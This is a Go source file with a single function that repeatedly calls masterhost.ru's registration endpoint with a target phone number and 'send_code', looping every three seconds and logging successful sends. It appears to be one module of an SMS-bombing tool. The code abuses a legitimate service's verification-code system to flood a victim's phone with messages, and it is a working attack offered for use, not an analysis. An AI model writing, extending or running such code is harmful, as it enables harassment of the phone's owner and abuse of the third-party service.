package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func masterhost() {
	req := newreq()
	req.SetRequestURI("https://cp.masterhost.ru/registration?phone=%2B" + num + "&handler=send_code")

	timeout := time.Second * 3
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `status":true`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
